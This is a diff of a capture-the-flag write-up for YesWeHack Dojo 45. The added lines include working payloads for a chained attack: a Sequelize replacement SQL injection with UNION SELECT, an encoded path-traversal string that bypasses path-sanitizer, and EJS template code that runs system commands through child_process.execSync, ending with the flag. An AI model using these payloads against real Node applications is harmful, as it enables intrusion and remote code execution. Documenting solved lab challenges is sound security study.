@@ -8,7 +8,7 @@ title = 'YesWeHack Dojo 45'
 # Introduction
 
 
-The dojo 45 challenge was one of the monthly CTF challenges on the YewWeHack plateform.
+The [Dojo 45 - Chainfection](https://dojo-yeswehack.com/challenge-of-the-month/dojo-45) challenge was one of the monthly CTF challenges on the YewWeHack platform.
 These challenges follow a common format whereby you are provided an input field in which you
 can submit a single input payload, this payload gets passed to an intermediate WAF component,
 then executed by the backend and finally the output of executing your input is provided to you.
@@ -97,9 +97,9 @@ database that respects 3 conditions.
 
 - The first condition is that, the row of that user should have been modified more recently than
   the date provided in the `updatedat` property of our JSON object (`data.updatedat`). Notice that `data.updatedat`
-  is passed to the query as a replacement within a sequelize literal.
+  is passed to the query as a [replacement](https://sequelize.org/docs/v6/core-concepts/raw-queries/#replacements) within a sequelize literal.
 - The name of that user should correspond to the `username` property of the JSON object we provide (`data.username`).
-  Notice that `data.username` is not passed as replacement, but placed directly as is within the query.
+  Notice that `data.username` is not passed as a replacement, but placed directly as is within the query.
 - The row of the returned user should have the property `verify` set to true.
 
 ```js
@@ -148,7 +148,7 @@ from the second Sequelize query, so that we can write to the path of that attach
 
 ## Sql Injection: SEQUELIZE ORM < 16.19.1
 
-According to issue https://github.com/sequelize/sequelize/issues/13817, when using replacements with user
+According to issue [CVE-2023-25813](https://github.com/sequelize/sequelize/issues/13817), when using replacements with user
 provided data, we get errors when the user's input contains the colon (`:`) symbol.
 
 In the specific case of this application, if `data.username` contains a colon (`:`), the query below
@@ -344,7 +344,7 @@ to build a file path which will be written to.
     fs.writeFileSync(file, data.content)
 ```
 
-According to this advisory  https://github.com/advisories/GHSA-94p5-r7cc-3rpr, this version of `path-sanitizer`
+According to this advisory  [CVE-2024-56198](https://github.com/advisories/GHSA-94p5-r7cc-3rpr), this version of `path-sanitizer`
 is vulnerable to path traversal payloads like `..@%2f..@%2f..@%2f..@%2f/etc/passwd`.
 
 ```
@@ -397,6 +397,40 @@ If the template code gets executed correctly we will see the result 2 rendered b
 ```
 
 ![Custom template code rendered by frontend](./7.png)
+
+Which is what we get.
+To achieve code execution, we use the following template code inspired from https://github.com/NketiahGodfred/EJS-ssti-exploit/blob/f979f39f16faaa4c600a98b51a835452a101784f/exploit.sh#L42C1-L42C255
+
+
+```js
+<%= global.process.mainModule.constructor._load('child_process').execSync('ls -la') %>
+```
+
+It lets us execute system commands, using global variables accessible via the scope of `index.ejs`.
+Our payload at this stage looks like
+
+```json
+{ "username": ":updatedat", "updatedat": ") UNION SELECT `id`, `name`, `verify`, `attachment`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`name` = \"leet\";-- -", "attachment": "..@%2f..@%2f..@%2f..@%2f/tmp/view/index.ejs", "content": "<%= global.process.mainModule.constructor._load('child_process').execSync('ls -la') %>"}
+```
+
+When submitted to input field of the challenge, we get the following response.
+
+![Response from RCE ejs template code](./8.png)
+
+## POC
+
+Given that the file containing the flag is generated on every new request with a random cryptographic string 
+attached to its name, we use the linux wildcard `cat flag*` to match it, irrespective of the random string appended to its name.
+
+The final payload for the flag is shown below.
+
+```json
+{ "username": ":updatedat", "updatedat": ") UNION SELECT `id`, `name`, `verify`, `attachment`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`name` = \"leet\";-- -", "attachment": "..@%2f..@%2f..@%2f..@%2f/tmp/view/index.ejs", "content": "<%= global.process.mainModule.constructor._load('child_process').execSync('cat flag*.txt') %>"}
+```
+
+![Flag obtained via final payload](./9.png)
+
+flag: FLAG{Bug_C4ins_Br1ng5_Th3_B3st_Imp4ct} 
 
 # References
 
